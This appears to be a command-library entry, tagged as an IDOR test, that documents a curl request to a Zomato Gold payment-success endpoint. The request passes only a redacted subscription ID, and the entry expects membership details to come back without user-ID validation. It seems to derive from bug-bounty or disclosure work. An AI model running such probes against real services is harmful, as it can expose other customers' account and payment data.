---
id: cmd-uuid-003
data: >-
  curl -X GET
  "https://www.zomato.com/gold/payment-success?subscription_id=███████" -i
tags:
  - web
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.657Z'
verified: false
validated: true
submitted: true
---
# curl-subscription-id-only

## Command

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?subscription_id=███████" -i
```

## Description

Accesses endpoint using only subscription_id, omitting user_id.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `subscription_id=███████` | Target ID | Yes |
| `-i` | Headers included | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?subscription_id=███████" -i
```

## Expected Output

Details tied to membership ID without user_id validation.

## Related

- [[Related Procedure]]
